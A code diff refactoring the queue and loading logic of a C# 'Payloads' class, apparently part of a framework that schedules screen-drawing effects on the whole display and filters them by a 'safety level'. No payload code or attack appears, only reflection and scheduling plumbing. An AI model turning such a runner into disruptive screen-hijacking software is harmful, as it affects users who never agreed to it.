@@ -4,12 +4,11 @@
 // file, You can obtain one at http://mozilla.org/MPL/2.0/.
 
 using System.Diagnostics;
+using System.Drawing;
 using System.Reflection;
-using System.Timers;
 using Spectre.Console;
 using TheAirBlow.Zigman.Attributes;
 using TheAirBlow.Zigman.Exceptions;
-using Timer = System.Timers.Timer;
 
 namespace TheAirBlow.Zigman;
 
@@ -38,11 +37,6 @@ public partial class Payloads
     private Dictionary<string, Payload> _payloads = new();
 
     /// <summary>
-    /// Queue timer
-    /// </summary>
-    private Timer _timer = new();
-
-    /// <summary>
     /// Payloads queue
     /// </summary>
     private Queue<Payload> _queue = new();
@@ -52,11 +46,6 @@ public partial class Payloads
     /// </summary>
     private ThreadsManager _manager;
 
-    /// <summary>
-    /// Warn about non-static members
-    /// </summary>
-    private bool _warn;
-    
     /// <summary>
     /// Safety Level
     /// </summary>
@@ -75,6 +64,26 @@ public partial class Payloads
     private static int SubPayloadsCount;
 
     /// <summary>
+    /// Sub-Payloads prefix
+    /// </summary>
+    private string SubPayloadsPrefix = string.Empty;
+
+    /// <summary>
+    /// Display's Handle
+    /// </summary>
+    protected readonly IntPtr DisplayHandle = CreateDC();
+    
+    /// <summary>
+    /// C# GDI+ with the Display
+    /// </summary>
+    protected Graphics DisplayGraphics;
+
+    /// <summary>
+    /// Global Random
+    /// </summary>
+    protected readonly Random Random = new();
+
+    /// <summary>
     /// Modify IDs for this Payloads instance
     /// to be formatted properly.
     /// </summary>
@@ -85,10 +94,11 @@ public partial class Payloads
         // of the sub-threads, and there may be
         // payloads with same IDs inside different
         // Payloads classes.
+        SubPayloadsPrefix = $"SubPayload{SubPayloadsCount}.";
+        AnsiConsole.MarkupLine($"[lightskyblue3_1][[[underline]{GetType().Name}[/]/ModifyIds]][/] [grey]INFO:[/] Prefix: {SubPayloadsPrefix}");
         var toReplace = new Dictionary<string, string>();
         foreach (var i in _payloads) {
-            var newId = $"SubPayload{SubPayloadsCount}." +
-                        $"{i.Value.PayloadAttribute.Identifier}";
+            var newId = $"{SubPayloadsPrefix}{i.Value.PayloadAttribute.Identifier}";
             i.Value.PayloadAttribute.Identifier = newId;
             toReplace.Add(i.Key, newId);
         }
@@ -106,37 +116,27 @@ public partial class Payloads
     /// Set the settings to use
     /// </summary>
     /// <param name="manager">Threads Manager</param>
-    /// <param name="warn">Warn about non-static members</param>
     /// <param name="level">Safety Level</param>
-    internal void SetSettings(ThreadsManager manager, bool warn, SafetyLevel level)
+    internal void SetSettings(ThreadsManager manager, SafetyLevel level)
     {
         _manager = manager;
         _level = level;
-        _warn = warn;
     }
 
     /// <summary>
     /// Load all payloads
     /// </summary>
-    internal void Initialize()
+    internal void Initialize(List<Type>? classes = null)
     {
-        AnsiConsole.MarkupLine($"[grey]INFO:[/] Initializing Payloads...");
+        DisplayGraphics = Graphics.FromHdc(DisplayHandle);
+        classes ??= new List<Type> { GetType() };
         var watch = new Stopwatch();
         watch.Start();
-        if (_warn) AnsiConsole.MarkupLine($"[grey]INFO:[/] Set WarnAboutNonStatic" +
-                                         $" to false if you want to disable " +
-                                         $"non-static warnings!");
-        
         // We would make sure the queue positions are unique
         var queue = new SortedDictionary<int, Payload>();
         var names = new List<string>();
-        foreach (var i in GetType().GetMethods()) {
-            // Ignore non-static members
-            if (i.IsStatic) {
-                if (_warn) AnsiConsole.MarkupLine($"[yellow]WARN:[/] Found non-static method {i.Name}");
-                continue;
-            }
-            
+        foreach (var type in classes)
+        foreach (var i in type.GetMethods()) {
             // Check for arguments
             if (i.GetGenericArguments().Length != 0)
                 throw new InvalidPayloadException($"Arguments present, method {i.Name}!");
@@ -150,12 +150,13 @@ public partial class Payloads
             
             // Skip if the SafetyLevel if higher
             if (payloadAttrContent.SafetyLevel > _level) {
-                AnsiConsole.MarkupLine($"[yellow]WARN:[/] {i.Name}'s safety level is too high, skipping...");
+                AnsiConsole.MarkupLine($"[lightskyblue3_1][[[underline]{GetType().Name}[/]/Initialize]][/] [yellow]WARN:[/] {i.Name}'s safety level is too high, skipping...");
                 continue;
             }
             
             var payload = new Payload {
                 PayloadAttribute = payloadAttrContent,
+                Payloads = this,
                 Method = i
             };
 
@@ -184,13 +185,13 @@ public partial class Payloads
             // Process sub-payloads
             if (i.ReturnType.IsSubclassOf(typeof(Payloads))) {
                 // Get the return value
-                var obj = i.Invoke(null, null);
+                var obj = i.Invoke(this, null);
                 if (obj == null) 
                     throw new InvalidPayloadException($"Return value is null, method {i.Name}!");
                 var value = (Payloads)obj; 
                 
                 // Setup the Payloads instance
-                value.SetSettings(_manager, _warn, _level);
+                value.SetSettings(_manager, _level);
                 value.Initialize(); value.ModifyIds();
                 
                 // Make the thread wait until the Payload's queue gets emptied
@@ -199,9 +200,7 @@ public partial class Payloads
 
                 // Replace some things to prevent unexpected behaviour
                 payload.PayloadAttribute.RunOnce = true;
-            } 
-
-            if (i.ReturnType != typeof(void))
+            } else if (i.ReturnType != typeof(void))
                 throw new InvalidPayloadException($"Invalid return type, method {i.Name}!");
             
             // Save the payload's MethodInfo
@@ -213,7 +212,7 @@ public partial class Payloads
             _queue.Enqueue(i);
 
         watch.Stop();
-        AnsiConsole.MarkupLine($"[grey]INFO:[/] Initialization done in {watch.Elapsed}!");
+        AnsiConsole.MarkupLine($"[lightskyblue3_1][[[underline]{GetType().Name}[/]/Initialize]][/] [grey]INFO:[/] Done in {watch.Elapsed}!");
     }
 
     /// <summary>
@@ -233,21 +232,22 @@ public partial class Payloads
         foreach (var i in _payloads)
             _manager.RemovePayload(i.Key);
     }
+    
+    /// <summary>
+    /// Stops a payload
+    /// </summary>
+    /// <param name="id">Payload's ID</param>
+    public void StopPayload(string id)
+        => _manager.RemovePayload($"{SubPayloadsPrefix}{id}");
 
     /// <summary>
     /// Starts up the queue
     /// </summary>
     internal void StartQueue()
     {
-        AnsiConsole.MarkupLine("[grey]INFO:[/] Starting queue...");
-        
-        _timer.Interval = 1;
-        // Not the best way to do this,
-        // but I do not want extra arguments.
-        _timer.Elapsed += (_, _) => TimerRoutine();
-        _timer.Start();
-        
-        AnsiConsole.MarkupLine("[grey]INFO:[/] Queue successfully started!");
+        AnsiConsole.MarkupLine($"[lightskyblue3_1][[[underline]{GetType().Name}[/]/StartQueue]][/] [grey]INFO:[/] Starting queue...");
+        new Thread(TimerRoutine).Start();
+        AnsiConsole.MarkupLine($"[lightskyblue3_1][[[underline]{GetType().Name}[/]/StartQueue]][/] [grey]INFO:[/] Queue successfully started!");
     }
 
     /// <summary>
@@ -258,21 +258,22 @@ public partial class Payloads
     /// <summary>
     /// Timer's routine
     /// </summary>
-    private void TimerRoutine()
+    private async void TimerRoutine()
     {
         if (_toStop != null) {
             _manager.RemovePayload(_toStop);
             _toStop = null;
         }
         if (_queue.Count == 0) {
-            AnsiConsole.MarkupLine("[yellow]WARN:[/] The queue got emptied!");
-            _timer.Stop();
+            AnsiConsole.MarkupLine($"[lightskyblue3_1][[[underline]{GetType().Name}[/]/TimerRoutine]][/] [yellow]WARN:[/] The queue got emptied!");
             return;
         }
         var item = _queue.Dequeue();
         _manager.AddPayload(item.PayloadAttribute.Identifier, item);
-        _timer.Interval = item.UseQueueAttribute.DelayBeforeNext;
+        if (item.IsSubPayloads) while (item.Payloads.GetQueueLength() != 0) { }
         if (item.UseQueueAttribute.AutoStop)
             _toStop = item.PayloadAttribute.Identifier;
+        await Task.Delay(item.UseQueueAttribute.DelayBeforeNext);
+        TimerRoutine();
     }
 }
